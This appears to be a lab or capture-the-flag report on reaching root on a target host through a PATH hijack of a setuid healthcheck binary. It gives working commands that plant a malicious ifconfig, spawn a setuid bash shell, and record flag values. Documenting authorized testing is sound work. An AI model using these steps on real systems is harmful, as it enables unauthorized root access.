# Phase 6 - Privilege Escalation and Objectives

Date: 2026-09-19
Operator system: Kali Linux (attacker) -> OPFOR-02 (target)
Objective: Identify and validate a privilege escalation path. Reach root. Collect mission proofs.

## Tools Used
- strings
- Standard bash PATH manipulation
- /usr/bin/healthcheck (target binary)

## Vulnerability Identified

### SUID Binary PATH Hijack - /usr/bin/healthcheck

Analysis via strings revealed the binary executes the following via system():

clear ; echo 'System Health Check' ; echo '' ; echo 'Scanning System' ; sleep 2 ; ifconfig ; fdisk -l ; du -h


All commands called without absolute paths. The binary uses system() which inherits the calling process's PATH environment variable. As apache, we control PATH, and the binary runs as root due to SUID bit.

## Exploitation Steps

Step 1 - Create malicious ifconfig in /tmp:

echo 'cp /bin/bash /tmp/rootbash && chmod 4777 /tmp/rootbash' > /tmp/ifconfig
chmod +x /tmp/ifconfig


Step 2 - Prepend /tmp to PATH and execute healthcheck in same environment:

export PATH=/tmp:$PATH ; /usr/bin/healthcheck


Step 3 - Verify SUID rootbash created:

ls -la /tmp/rootbash
-rwsrwxrwx 1 root root 864208 Sep 19 17:23 /tmp/rootbash


Step 4 - Execute rootbash with privilege preservation:

/tmp/rootbash -p -c 'id'


Result:

uid=479(apache) gid=416(apache) euid=0(root) groups=0(root),416(apache)


euid=0 (root) confirmed.

## Mission Proofs

| Flag | Location | Value |
|------|----------|-------|
| user.txt | /home/almirant/user.txt | d41d8cd98f00b204e9800998ecf8427e |
| root.txt | /root/root.txt | eaff25eaa9ffc8b62e3dfebf70e83a7b |

## Evidence References
- 02_screenshots/phase6_rootbash_id.png (take this screenshot now)
- 02_screenshots/phase6_root_flag.png (take this screenshot now)
